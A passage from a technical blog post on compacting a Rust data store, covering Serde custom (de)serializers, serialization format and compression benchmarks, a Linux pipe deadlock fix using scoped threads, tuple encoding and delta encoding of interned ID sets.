        <span>// Tell Serde to deserialize a sequence of items using the given visitor.</span>
        <span>deserializer</span><span>.deserialize_seq</span><span>(</span><span>InternerVisitor</span><span>::</span><span>new</span><span>())</span>
    <span>}</span>
<span>}</span>

<span>// A visitor to create an Interner&lt;T&gt;.</span>
<span>struct</span> <span>InternerVisitor</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span>
    <span>// This visitor is stateless, but Rust requires to use the generic parameter T.</span>
    <span>_phantom</span><span>:</span> <span>PhantomData</span><span>&lt;</span><span>fn</span><span>()</span> <span>-&gt;</span> <span>Interner</span><span>&lt;</span><span>T</span><span>&gt;&gt;</span><span>,</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>InternerVisitor</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>new</span><span>()</span> <span>-&gt;</span> <span>Self</span> <span>{</span>
        <span>Self</span> <span>{</span>
            <span>_phantom</span><span>:</span> <span>PhantomData</span><span>,</span>
        <span>}</span>
    <span>}</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>'de</span><span>,</span> <span>T</span><span>&gt;</span> <span>Visitor</span><span>&lt;</span><span>'de</span><span>&gt;</span> <span>for</span> <span>InternerVisitor</span><span>&lt;</span><span>T</span><span>&gt;</span>
<span>where</span>
    <span>T</span><span>:</span> <span>Eq</span> <span>+</span> <span>Hash</span> <span>+</span> <span>Deserialize</span><span>&lt;</span><span>'de</span><span>&gt;</span><span>,</span>
<span>{</span>
    <span>// Tell Serde that the output will be an Interner.</span>
    <span>type</span> <span>Value</span> <span>=</span> <span>Interner</span><span>&lt;</span><span>T</span><span>&gt;</span><span>;</span>

    <span>// Error message to display if the input stream doesn't contain a sequence of Ts.</span>
    <span>fn</span> <span>expecting</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>formatter</span><span>:</span> <span>&amp;</span><span>mut</span> <span>std</span><span>::</span><span>fmt</span><span>::</span><span>Formatter</span><span>)</span> <span>-&gt;</span> <span>std</span><span>::</span><span>fmt</span><span>::</span><span>Result</span> <span>{</span>
        <span>formatter</span><span>.write_str</span><span>(</span><span>"a sequence of values"</span><span>)</span>
    <span>}</span>

    <span>// Callback invoked by Serde with a sequence of items.</span>
    <span>fn</span> <span>visit_seq</span><span>&lt;</span><span>A</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>mut</span> <span>seq</span><span>:</span> <span>A</span><span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>Self</span><span>::</span><span>Value</span><span>,</span> <span>A</span><span>::</span><span>Error</span><span>&gt;</span>
    <span>where</span>
        <span>A</span><span>:</span> <span>SeqAccess</span><span>&lt;</span><span>'de</span><span>&gt;</span><span>,</span>
    <span>{</span>
        <span>// Serde may give us a hint about the number of items in the sequence.</span>
        <span>let</span> <span>mut</span> <span>interner</span> <span>=</span> <span>match</span> <span>seq</span><span>.size_hint</span><span>()</span> <span>{</span>
            <span>None</span> <span>=&gt;</span> <span>Interner</span><span>::</span><span>default</span><span>(),</span>
            <span>Some</span><span>(</span><span>size_hint</span><span>)</span> <span>=&gt;</span> <span>Interner</span> <span>{</span>
                <span>vec</span><span>:</span> <span>Vec</span><span>::</span><span>with_capacity</span><span>(</span><span>size_hint</span><span>),</span>
                <span>map</span><span>:</span> <span>HashMap</span><span>::</span><span>with_capacity</span><span>(</span><span>size_hint</span><span>),</span>
                <span>references</span><span>:</span> <span>0</span><span>,</span>
            <span>},</span>
        <span>};</span>

        <span>// We gather the elements in a loop and return an Interner.</span>
        <span>while</span> <span>let</span> <span>Some</span><span>(</span><span>t</span><span>)</span> <span>=</span> <span>seq</span><span>.next_element</span><span>()</span><span>?</span> <span>{</span>
            <span>interner</span><span>.push</span><span>(</span><span>t</span><span>);</span>
        <span>}</span>

        <span>Ok</span><span>(</span><span>interner</span><span>)</span>
    <span>}</span>
<span>}</span>

<span>// For completeness, here is the new push() function, slightly more efficient than intern().</span>
<span>impl</span><span>&lt;</span><span>T</span><span>:</span> <span>Eq</span> <span>+</span> <span>Hash</span><span>&gt;</span> <span>Interner</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span>
    <span>/// Unconditionally push a value, without validating that it's already interned.</span>
    <span>fn</span> <span>push</span><span>(</span><span>&amp;</span><span>mut</span> <span>self</span><span>,</span> <span>value</span><span>:</span> <span>T</span><span>)</span> <span>-&gt;</span> <span>u32</span> <span>{</span>
        <span>let</span> <span>id</span> <span>=</span> <span>self</span><span>.vec</span><span>.len</span><span>();</span>
        <span>assert!</span><span>(</span><span>id</span> <span>&lt;=</span> <span>u32</span><span>::</span><span>MAX</span> <span>as</span> <span>usize</span><span>);</span>
        <span>let</span> <span>id</span> <span>=</span> <span>id</span> <span>as</span> <span>u32</span><span>;</span>

        <span>let</span> <span>rc</span><span>:</span> <span>Rc</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>=</span> <span>Rc</span><span>::</span><span>new</span><span>(</span><span>value</span><span>);</span>
        <span>self</span><span>.vec</span><span>.push</span><span>(</span><span>Rc</span><span>::</span><span>clone</span><span>(</span><span>&amp;</span><span>rc</span><span>));</span>
        <span>self</span><span>.map</span><span>.insert</span><span>(</span><span>rc</span><span>,</span> <span>id</span><span>);</span>

        <span>id</span>
    <span>}</span>
<span>}</span>
</code></pre></div>

<p>Here is a comparison of the serialization formats at this point, sorted by encoded size.
Postcard is a clear winner at 3.2 MB, much less than JSON at 65 MB in pretty-printed form or 26 MB in minified form (commit <a href="https://github.com/gendx/rust-interning/commit/b5013e6ceed00263e4744ea4f6a7ce27b1e83b8d">b5013e6</a>).</p>

<table>
  <thead>
    <tr>
      <th>Format</th>
      <th>Bytes</th>
      <th>Relative size</th>
      <th>Encode time</th>
      <th>Decode time</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Postcard</td>
      <td>3275869</td>
      <td>0.29%</td>
      <td>17 ms</td>
      <td>16 ms</td>
    </tr>
    <tr>
      <td>Bincode</td>
      <td>5437330</td>
      <td>0.48%</td>
      <td>16 ms</td>
      <td>24 ms</td>
    </tr>
    <tr>
      <td>CBOR</td>
      <td>17484567</td>
      <td>1.54%</td>
      <td>56 ms</td>
      <td>128 ms</td>
    </tr>
    <tr>
      <td>JSON</td>
      <td>26485131</td>
      <td>2.33%</td>
      <td>74 ms</td>
      <td>118 ms</td>
    </tr>
    <tr>
      <td>JSON (pretty)</td>
      <td>65026281</td>
      <td>5.72%</td>
      <td>152 ms</td>
      <td>135 ms</td>
    </tr>
  </tbody>
</table>

<p>It’s also interesting to compare the encoding and decoding times, as the more compact formats tend to be faster to process too.
Take them with a grain of salt though, that’s not a proper benchmark but a single data point on my machine, and without using any optimized library like <a href="https://docs.rs/simd-json/"><code>simd_json</code></a>.</p>

<h3 id="compression-and-fighting-the-rust-borrow-checker-linux-pipes-005"><span><a href="#compression-and-fighting-the-rust-borrow-checker-linux-pipes-005"></a></span>Compression and fighting <del>the Rust borrow checker</del> Linux pipes (0.05%)</h3>

<p>Once we have serialized the database into bytes, we can apply general-purpose compression to it.
Indeed, even after interning we expect some amount of redundancy: for example disruption messages follow templates where only some details vary.</p>

<p>I didn’t really want to investigate the various Rust compression libraries, as I thought that spawning a command would be simpler for this experiment.
Indeed, the <a href="https://doc.rust-lang.org/std/process/struct.Command.html"><code>Command</code></a> type in the Rust standard library allows to easily run other programs, passing them arguments and inputs in a safe way, and collecting the output.
In principle, one should configure <a href="https://doc.rust-lang.org/std/process/struct.Stdio.html#method.piped"><code>Stdio::piped()</code></a> to interact with stdin/stdout/stderr of the child process, and we’re good to go… or so I thought.</p>

<div><pre><code><span>// Naive implementation, which doesn't work (inter-process deadlock).</span>
<span>fn</span> <span>gzip_compress</span><span>(</span><span>input</span><span>:</span> <span>&amp;</span><span>[</span><span>u8</span><span>])</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>Vec</span><span>&lt;</span><span>u8</span><span>&gt;</span><span>,</span> <span>Box</span><span>&lt;</span><span>dyn</span> <span>std</span><span>::</span><span>error</span><span>::</span><span>Error</span><span>&gt;&gt;</span> <span>{</span>
    <span>let</span> <span>compress</span> <span>=</span> <span>Command</span><span>::</span><span>new</span><span>(</span><span>"gzip"</span><span>)</span>
        <span>.arg</span><span>(</span><span>"-c"</span><span>)</span>  <span>// Compress to stdout.</span>
        <span>.arg</span><span>(</span><span>"-6"</span><span>)</span>  <span>// Compression level.</span>
        <span>.stdin</span><span>(</span><span>Stdio</span><span>::</span><span>piped</span><span>())</span>
        <span>.stdout</span><span>(</span><span>Stdio</span><span>::</span><span>piped</span><span>())</span>
        <span>.stderr</span><span>(</span><span>Stdio</span><span>::</span><span>null</span><span>())</span>
        <span>.spawn</span><span>()</span><span>?</span><span>;</span>

    <span>compress</span><span>.stdin</span><span>.as_mut</span><span>()</span><span>.expect</span><span>(</span><span>"Failed to open stdin"</span><span>)</span><span>.write_all</span><span>(</span><span>input</span><span>)</span><span>?</span><span>;</span>

    <span>let</span> <span>output</span> <span>=</span> <span>compress</span><span>.wait_with_output</span><span>()</span><span>?</span><span>;</span>
    <span>if</span> <span>!</span><span>output</span><span>.status</span><span>.success</span><span>()</span> <span>{</span>
        <span>/* Return an error */</span>
    <span>}</span>
    <span>Ok</span><span>(</span><span>output</span><span>.stdout</span><span>)</span>
<span>}</span>
</code></pre></div>

<p>Indeed, while this naive implementation worked for simple examples with a short input, it seemingly deadlocked once I tried to compress larger inputs!</p>

<p>The answer lies in the <a href="https://www.man7.org/linux/man-pages/man7/pipe.7.html">Linux manual for pipes</a>.
When a parent and child process communicate via stdin/stdout/stderr, this is done via a so-called <em>pipe</em>.
Under the hood, the kernel provides a buffer where one process can write and the other process can read.</p>

<p>However, to avoid exhausting the system resources, this buffer has a limited size.
In particular, <code>/proc/sys/fs/pipe-max-size</code> sets the maximum size (in bytes) of one pipe, which is 1 MiB on my system.
Additionally, <code>/proc/sys/fs/pipe-user-pages-hard</code> and <code>/proc/sys/fs/pipe-user-pages-soft</code> set the maximum number of pages that one user can create in terms of pipes (across all its processes), which is 64 MiB on my system.</p>

<div><pre><code><span>$ </span><span>cat</span> /proc/sys/fs/pipe-max-size
1048576
<span>$ </span><span>cat</span> /proc/sys/fs/pipe-user-pages-hard
0
<span>$ </span><span>cat</span> /proc/sys/fs/pipe-user-pages-soft
16384
</code></pre></div>

<p>Back to invoking <code>gzip</code>: the problem is that if the input is too large, the <code>write_all(input)</code> call will be blocked until the child (gzip) process reads from the pipe.
The <code>gzip</code> process will indeed start reading from it, but will also want to write compressed output as soon as possible to its standard output (to limit its own memory usage).
However, with the naive implementation, my parent process isn’t reading this output yet until it’s done writing all the input.
So the compressed output will fill its pipe too.</p>

<p><a href="https://gendignoux.com/blog/images/rust-interning-2000x/pipes-writing.rcvX_WUfg9Zh.svg"><img src="https://gendignoux.com/blog/images/rust-interning-2000x/pipes-writing.rcvX_WUfg9Zh.svg" width="840" height="275" loading="lazy" alt="Diagram of a compression process' stdin and stdout pipes filling up"></a>
Linux pipes around a compression process.</p>

<p>At some point, we’ll end up in a situation where my parent process is blocked on writing more input to the stdin pipe (waiting for gzip to read it) while the child gzip process is blocked on writing more compressed output to the stdout pipe (waiting for the parent process to read it).
In other words: an inter-process deadlock!</p>

<p><a href="https://gendignoux.com/blog/images/rust-interning-2000x/pipes-full.WTvcH5bPcbn8.svg"><img src="https://gendignoux.com/blog/images/rust-interning-2000x/pipes-full.WTvcH5bPcbn8.svg" width="840" height="275" loading="lazy" alt="Diagram with full stdin and stdout pipes"></a>
Full pipes causing a deadlock.</p>

<p>Be really careful about this limitation: even if you think that you won’t need to write more than 1 MiB (or whatever <code>/proc/sys/fs/pipe-max-size</code> says on your system), the total per-user limit may restrict pipes to only one page (once <code>/proc/sys/fs/pipe-user-pages-soft</code> is reached) which is usually 4 KiB, i.e. much lower than the 1 MiB default.</p>

<p>To remediate that, we need to make sure to both write uncompressed input and read compressed output at the same time, i.e. use threads.
We can still use the convenient functions <a href="https://doc.rust-lang.org/std/io/trait.Write.html#method.write_all"><code>write_all()</code></a> and <a href="https://doc.rust-lang.org/std/io/trait.Read.html#method.read_to_end"><code>read_to_end()</code></a> as long as they happen in parallel threads.</p>

<p>I ended up creating a utility function to automate this pattern of writing all of an input slice and reading all of the output.
Note the use of <a href="https://doc.rust-lang.org/stable/std/thread/fn.scope.html"><code>std::thread::scope()</code></a>, which allows to capture an input slice with non-static lifetime.</p>

<div><pre><code><span>#![feature(exit_status_error)]</span>

<span>fn</span> <span>io_command</span><span>(</span><span>mut</span> <span>child</span><span>:</span> <span>Child</span><span>,</span> <span>input</span><span>:</span> <span>&amp;</span><span>[</span><span>u8</span><span>])</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>Vec</span><span>&lt;</span><span>u8</span><span>&gt;</span><span>,</span> <span>Box</span><span>&lt;</span><span>dyn</span> <span>std</span><span>::</span><span>error</span><span>::</span><span>Error</span><span>&gt;&gt;</span> <span>{</span>
    <span>std</span><span>::</span><span>thread</span><span>::</span><span>scope</span><span>(|</span><span>s</span><span>|</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>Vec</span><span>&lt;</span><span>u8</span><span>&gt;</span><span>,</span> <span>Box</span><span>&lt;</span><span>dyn</span> <span>std</span><span>::</span><span>error</span><span>::</span><span>Error</span><span>&gt;&gt;</span> <span>{</span>
        <span>let</span> <span>mut</span> <span>stdin</span> <span>=</span> <span>child</span><span>.stdin</span><span>.take</span><span>()</span><span>.expect</span><span>(</span><span>"Failed to open stdin"</span><span>);</span>
        <span>let</span> <span>mut</span> <span>stdout</span> <span>=</span> <span>child</span><span>.stdout</span><span>.take</span><span>()</span><span>.expect</span><span>(</span><span>"Failed to open stdout"</span><span>);</span>

        <span>let</span> <span>input_thread</span> <span>=</span> <span>s</span><span>.spawn</span><span>(</span><span>move</span> <span>||</span> <span>-&gt;</span> <span>std</span><span>::</span><span>io</span><span>::</span><span>Result</span><span>&lt;</span><span>()</span><span>&gt;</span> <span>{</span>
            <span>eprintln!</span><span>(</span><span>"Writing {} bytes..."</span><span>,</span> <span>input</span><span>.len</span><span>());</span>
            <span>stdin</span><span>.write_all</span><span>(</span><span>input</span><span>)</span><span>?</span><span>;</span>
            <span>drop</span><span>(</span><span>stdin</span><span>);</span>
            <span>Ok</span><span>(())</span>
        <span>});</span>

        <span>let</span> <span>output_thread</span> <span>=</span> <span>s</span><span>.spawn</span><span>(</span><span>move</span> <span>||</span> <span>-&gt;</span> <span>std</span><span>::</span><span>io</span><span>::</span><span>Result</span><span>&lt;</span><span>Vec</span><span>&lt;</span><span>u8</span><span>&gt;&gt;</span> <span>{</span>
            <span>eprintln!</span><span>(</span><span>"Reading bytes..."</span><span>);</span>
            <span>let</span> <span>mut</span> <span>output</span> <span>=</span> <span>Vec</span><span>::</span><span>new</span><span>();</span>
            <span>stdout</span><span>.read_to_end</span><span>(</span><span>&amp;</span><span>mut</span> <span>output</span><span>)</span><span>?</span><span>;</span>
            <span>Ok</span><span>(</span><span>output</span><span>)</span>
        <span>});</span>

        <span>eprintln!</span><span>(</span><span>"Waiting for child..."</span><span>);</span>
        <span>child</span><span>.wait</span><span>()</span><span>?</span><span>.exit_ok</span><span>()</span><span>?</span><span>;</span>

        <span>input_thread</span><span>.join</span><span>()</span><span>.expect</span><span>(</span><span>"Failed to join input thread"</span><span>)</span><span>?</span><span>;</span>
        <span>let</span> <span>output</span> <span>=</span> <span>output_thread</span>
            <span>.join</span><span>()</span>
            <span>.expect</span><span>(</span><span>"Failed to join output thread"</span><span>)</span><span>?</span><span>;</span>
        <span>Ok</span><span>(</span><span>output</span><span>)</span>
    <span>})</span>
<span>}</span>
</code></pre></div>

<p>Back to the original topic, I’ve benchmarked a few common compression algorithms.
What they show is that the size difference between formats tends to get smaller after compression.
At this point, we’ve reached the 2000x size reduction mark on the most compact formats: from 1.1 GB down to 530 KB for the May 2024 data (commit <a href="https://github.com/gendx/rust-interning/commit/b7281f5da83da3235ec88348a409aefe17c15ac9">b7281f5</a>).</p>

<p>
<a href="https://gendignoux.com/blog/images/rust-interning-2000x/histogram-sizes-b7281f5.AVEOpxGMp-tq.svg">
<picture>
  <source srcset="https://gendignoux.com/blog/images/rust-interning-2000x/histogram-sizes-b7281f5-dark.gDT6pHGl_Zc1.svg" media="(prefers-color-scheme: dark)" width="800" height="600">
  <img src="https://gendignoux.com/blog/images/rust-interning-2000x/histogram-sizes-b7281f5.AVEOpxGMp-tq.svg" width="800" height="600" loading="lazy" alt="Histogram of encoded sizes">
</picture>
</a>
</p>

<table id="table-sizes-b7281f5">
<thead>
<tr>
<th>Format</th>
<th colspan="2">Serialization</th>
<th colspan="2">gzip -6</th>
<th colspan="2">brotli -6</th>
<th colspan="2">xz -6</th>
</tr>
</thead>
<tbody>
<tr>
<td>Postcard</td><td>3275869</td><td>0.29%</td><td>861917</td><td>0.08%</td><td>721120</td><td>0.06%</td><td>539200</td><td>0.05%</td>
</tr>
<tr>
<td>Bincode</td><td>5437330</td><td>0.48%</td><td>893271</td><td>0.08%</td><td>700194</td><td>0.06%</td><td>529996</td><td>0.05%</td>
</tr>
<tr>
<td>CBOR</td><td>17484567</td><td>1.54%</td><td>1187575</td><td>0.10%</td><td>826739</td><td>0.07%</td><td>615124</td><td>0.05%</td>
</tr>
<tr>
<td>JSON</td><td>26485131</td><td>2.33%</td><td>1253219</td><td>0.11%</td><td>916683</td><td>0.08%</td><td>736036</td><td>0.06%</td>
</tr>
<tr>
<td>JSON (pretty)</td><td>65026281</td><td>5.72%</td><td>1563418</td><td>0.14%</td><td>1006035</td><td>0.09%</td><td>958624</td><td>0.08%</td>
</tr>
</tbody>
</table>

<p>However, similar sizes after compression doesn’t mean you should use JSON and forget about it: (de)serialization and (de)compression speed are faster with the more optimized formats like Postcard!</p>

<p>
<a href="https://gendignoux.com/blog/images/rust-interning-2000x/histogram-times-b7281f5.ghE9gu7LV6EA.svg">
<picture>
  <source srcset="https://gendignoux.com/blog/images/rust-interning-2000x/histogram-times-b7281f5-dark.XWoRDMwNKkia.svg" media="(prefers-color-scheme: dark)" width="800" height="600">
  <img src="https://gendignoux.com/blog/images/rust-interning-2000x/histogram-times-b7281f5.ghE9gu7LV6EA.svg" width="800" height="600" loading="lazy" alt="Histogram of encoding and decoding times">
</picture>
</a>
</p>

<table id="table-times-b7281f5">
<thead>
<tr>
<th rowspan="2">Format</th>
<th colspan="2">Serialization</th>
<th colspan="2">gzip -6</th>
<th colspan="2">brotli -6</th>
<th colspan="2">xz -6</th>
</tr>
<tr>
<th>encode</th>
<th>decode</th>
<th>encode</th>
<th>decode</th>
<th>encode</th>
<th>decode</th>
<th>encode</th>
<th>decode</th>
</tr>
</thead>
<tbody>
<tr>
<td>Postcard</td><td>22 ms</td><td>27 ms</td><td>88 ms</td><td>21 ms</td><td>144 ms</td><td>18 ms</td><td>583 ms</td><td>37 ms</td>
</tr>
<tr>
<td>Bincode</td><td>9 ms</td><td>24 ms</td><td>166 ms</td><td>28 ms</td><td>191 ms</td><td>19 ms</td><td>1111 ms</td><td>39 ms</td>
</tr>
<tr>
<td>CBOR</td><td>72 ms</td><td>131 ms</td><td>189 ms</td><td>63 ms</td><td>230 ms</td><td>36 ms</td><td>3255 ms</td><td>51 ms</td>
</tr>
<tr>
<td>JSON</td><td>72 ms</td><td>100 ms</td><td>233 ms</td><td>96 ms</td><td>449 ms</td><td>44 ms</td><td>3314 ms</td><td>60 ms</td>
</tr>
<tr>
<td>JSON (pretty)</td><td>137 ms</td><td>129 ms</td><td>376 ms</td><td>180 ms</td><td>441 ms</td><td>74 ms</td><td>2934 ms</td><td>81 ms</td>
</tr>
</tbody>
</table>

<p>Another aspect that was out of scope for my experiment is the impact on code size: I expect the simpler formats to also compile to smaller code.
Be mindful of it especially if you’re deploying code for embedded systems or to <a href="https://webassembly.org/">WebAssembly</a> for a website.</p>

<h3 id="tuple-encoding"><span><a href="#tuple-encoding"></a></span>Tuple encoding</h3>

<p>Upon inspecting the serialized outputs more closely, I noticed that a lot of <code>_phantom</code> strings were present in the JSON or CBOR outputs.</p>

<div><pre><code><span>{</span><span>"id"</span><span>:</span><span> </span><span>11</span><span>,</span><span> </span><span>"_phantom"</span><span>:</span><span> </span><span>null</span><span>}</span><span>
</span></code></pre></div>

<p>Something like <code>Interned&lt;T&gt;</code> which I would expect to be serialized as a simple integer was taking much more space.</p>

<div><pre><code><span>struct</span> <span>Interned</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span>
    <span>id</span><span>:</span> <span>u32</span><span>,</span>
    <span>_phantom</span><span>:</span> <span>PhantomData</span><span>&lt;</span><span>fn</span><span>()</span> <span>-&gt;</span> <span>T</span><span>&gt;</span><span>,</span>
<span>}</span>
</code></pre></div>

<p>Indeed, by default Serde serializes each struct as a map, which causes two problems:</p>
<ol>
  <li>field names are serialized as keys in a map,</li>
  <li>zero-sized types like <code>PhantomData</code> are serialized even though they don’t contain any information and should be trivial to re-create.</li>
</ol>

<p>This default might be useful if your types evolve over time (fields added, removed or renamed) and you want to retain some level of “out-of-the-box” compatibility, but that’s a design choice<sup id="fnref:2"><a href="#fn:2" rel="footnote" role="doc-noteref">2</a></sup>.
In my case however, the <code>Interned&lt;T&gt;</code> abstraction was so ubiquitous that it meant a lot of redundancy.</p>

<p>After digging into it, I found <a href="https://github.com/serde-rs/serde/issues/297">these</a> <a href="https://github.com/serde-rs/serde/issues/1648">issues</a> as well as <a href="https://github.com/dtolnay/request-for-implementation/issues/3">this discussion</a> by the maintainer of Serde, which boiled down to serializing a struct as a tuple rather than as a map.
Given that tuples don’t have field names, that should address the problem.
This feature request never got implemented in the <code>serde</code> crate itself, but a separate <a href="https://docs.rs/serde_tuple/"><code>serde_tuple</code></a> crate provides the <code>Serialize_tuple</code> and <code>Deserialize_tuple</code> derive macros.</p>

<div><pre><code><span>use</span> <span>serde_tuple</span><span>::{</span><span>Deserialize_tuple</span><span>,</span> <span>Serialize_tuple</span><span>};</span>

<span>#[derive(Serialize_tuple,</span> <span>Deserialize_tuple)]</span>
<span>struct</span> <span>Interned</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span>
    <span>id</span><span>:</span> <span>u32</span><span>,</span>
    <span>_phantom</span><span>:</span> <span>PhantomData</span><span>&lt;</span><span>fn</span><span>()</span> <span>-&gt;</span> <span>T</span><span>&gt;</span><span>,</span>
<span>}</span>
</code></pre></div>

<p>This mitigated the first issue (commits <a href="https://github.com/gendx/rust-interning/commit/a9924e982e24805bf7f1cdbe417e4da4e10d4158">a9924e9</a> and <a href="https://github.com/gendx/rust-interning/commit/cec535911616652401202d6d7ff4367cb938123c">cec5359</a>).
However, the <code>PhantomData</code> still appeared in the serialized output as a <code>null</code> value.</p>



<p>Given how ubiquitous the <code>Interned</code> type is, I ended up <a href="#writing-custom-deserializers-with-serde-029">writing a custom serializer</a> once again.</p>

<div><pre><code><span>impl</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>Serialize</span> <span>for</span> <span>Interned</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>serialize</span><span>&lt;</span><span>S</span><span>&gt;</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>serializer</span><span>:</span> <span>S</span><span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>S</span><span>::</span><span>Ok</span><span>,</span> <span>S</span><span>::</span><span>Error</span><span>&gt;</span>
    <span>where</span>
        <span>S</span><span>:</span> <span>Serializer</span><span>,</span>
    <span>{</span>
        <span>serializer</span><span>.serialize_u32</span><span>(</span><span>self</span><span>.id</span><span>)</span>
    <span>}</span>
<span>}</span>
</code></pre></div>

<p>For the affected formats (CBOR and JSON), these optimizations reduced the encoded size by 72% to 75%.
The reduction was more modest after compression, ranging from 11% to 33% (commit <a href="https://github.com/gendx/rust-interning/commit/356bc0af128b19365a18145a12f816e90f9686d3">356bc0a</a>).</p>

<p>
<a href="https://gendignoux.com/blog/images/rust-interning-2000x/histogram-sizes-b7281f5-356bc0a.S5UoLPSeolh-.svg">
<picture>
  <source srcset="https://gendignoux.com/blog/images/rust-interning-2000x/histogram-sizes-b7281f5-356bc0a-dark.eoAr23sHfWWK.svg" media="(prefers-color-scheme: dark)" width="800" height="600">
  <img src="https://gendignoux.com/blog/images/rust-interning-2000x/histogram-sizes-b7281f5-356bc0a.S5UoLPSeolh-.svg" width="800" height="600" loading="lazy" alt="Histogram of encoded sizes">
</picture>
</a>
</p>

<table id="table-sizes-b7281f5-356bc0a">
  <thead>
    <tr>
      <th>Format</th>
      <th>Serialization</th>
      <th>gzip -6</th>
      <th>brotli -6</th>
      <th>xz -6</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Postcard</td>
      <td>3275869</td>
      <td>861917</td>
      <td>721120</td>
      <td>539200</td>
    </tr>
    <tr>
      <td>Bincode</td>
      <td>5437330</td>
      <td>893271</td>
      <td>700194</td>
      <td>529996</td>
    </tr>
    <tr>
      <td>CBOR</td>
      <td>4475821 (-74%)</td>
      <td>955541 (-20%)</td>
      <td>731878 (-11%)</td>
      <td>535068 (-13%)</td>
    </tr>
    <tr>
      <td>JSON</td>
      <td>6560658 (-75%)</td>
      <td>1005689 (-20%)</td>
      <td>777507 (-15%)</td>
      <td>545832 (-26%)</td>
    </tr>
    <tr>
      <td>JSON (pretty)</td>
      <td>18168838 (-72%)</td>
      <td>1162250 (-26%)</td>
      <td>890102 (-12%)</td>
      <td>639072 (-33%)</td>
    </tr>
  </tbody>
</table>

<p>Note that formats like Postcard and Bincode already perform this optimization by default, leveraging the fact that they are <a href="https://postcard.jamesmunns.com/wire-format#non-self-describing-format">not self-describing</a>.
By using the <code>serde_tuple</code> crate, you drop part of the self-describing guarantees for other formats like JSON too, as the sender and receiver must agree on the schema (e.g. the specific order of fields in each struct) to be able to communicate without data corruption.</p>

<h3 id="optimizing-sets-revisited"><span><a href="#optimizing-sets-revisited"></a></span>Optimizing sets revisited</h3>

<p>I’ve <a href="#sorting-sets-15">previously described</a> how sets of objects could be better unified by sorting them.
The naive (default) approach to serialize them is a list of interned IDs.
However, in practice these IDs are often sequential, because the underlying objects were created around the same time.
For example, all the disruptions that happened on the same day would appear next to each other in the <code>Interned&lt;Disruption&gt;</code> table.</p>

<div><pre><code><span>[</span><span>0</span><span>,</span><span> </span><span>70</span><span>,</span><span> </span><span>72</span><span>,</span><span> </span><span>73</span><span>,</span><span> </span><span>74</span><span>,</span><span> </span><span>75</span><span>,</span><span> </span><span>77</span><span>,</span><span> </span><span>78</span><span>,</span><span> </span><span>79</span><span>,</span><span> </span><span>80</span><span>,</span><span> </span><span>81</span><span>]</span><span>
</span></code></pre></div>

<p>So instead of serializing the IDs directly, we can use <a href="https://en.wikipedia.org/wiki/Delta_encoding">delta encoding</a>: serializing each ID as the difference from the previous ID.</p>

<div><pre><code><span>[</span><span>0</span><span>,</span><span> </span><span>70</span><span>,</span><span> </span><span>2</span><span>,</span><span> </span><span>1</span><span>,</span><span> </span><span>1</span><span>,</span><span> </span><span>1</span><span>,</span><span> </span><span>2</span><span>,</span><span> </span><span>1</span><span>,</span><span> </span><span>1</span><span>,</span><span> </span><span>1</span><span>,</span><span> </span><span>1</span><span>]</span><span>
</span></code></pre></div>

<p>This is beneficial for two reasons:</p>
<ul>
  <li>common serialization formats use variable-length encoding, meaning that small numbers are encoded in fewer bytes than larger numbers,</li>
  <li>if most of these differences are small numbers, there should be more redundancy that the compression algorithms should be able to exploit.</li>
</ul>

<p>As a <a href="#writing-custom-deserializers-with-serde-029">custom Serde serializer</a>, delta encoding is fairly straightforward to implement within each set.</p>

<div><pre><code><span>struct</span> <span>InternedSet</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span>
    <span>set</span><span>:</span> <span>Box</span><span>&lt;</span><span>[</span><span>Interned</span><span>&lt;</span><span>T</span><span>&gt;</span><span>]</span><span>&gt;</span><span>,</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>Serialize</span> <span>for</span> <span>InternedSet</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>serialize</span><span>&lt;</span><span>S</span><span>&gt;</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>serializer</span><span>:</span> <span>S</span><span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>S</span><span>::</span><span>Ok</span><span>,</span> <span>S</span><span>::</span><span>Error</span><span>&gt;</span>
    <span>where</span>
        <span>S</span><span>:</span> <span>Serializer</span><span>,</span>
    <span>{</span>
        <span>let</span> <span>mut</span> <span>prev</span> <span>=</span> <span>0</span><span>;</span>
        <span>serializer</span><span>.collect_seq</span><span>(</span><span>self</span><span>.set</span><span>.iter</span><span>()</span><span>.map</span><span>(|</span><span>x</span><span>|</span> <span>{</span>
            <span>let</span> <span>id</span> <span>=</span> <span>x</span><span>.id</span><span>();</span>
            <span>let</span> <span>diff</span> <span>=</span> <span>id</span> <span>-</span> <span>prev</span><span>;</span>
            <span>prev</span> <span>=</span> <span>id</span><span>;</span>
            <span>diff</span>
        <span>}))</span>
    <span>}</span>
<span>}</span>
</code></pre></div>

<p>While differential encoding didn’t affect the Bincode format (which encodes integers with a fixed size), the serialized size decreased by 9% to 19% for the others.
The size after compression saw a marked decrease (8% to 16%) with gzip and brotli, and a more modest one (4% to 8%) with xz (commit <a href="https://github.com/gendx/rust-interning/commit/4ea388f81630ba8750b258e824a120f37979549c">4ea388f</a>).</p>

<p>
<a href="https://gendignoux.com/blog/images/rust-interning-2000x/histogram-sizes-356bc0a-4ea388f.Ek14Qs--wRbq.svg">
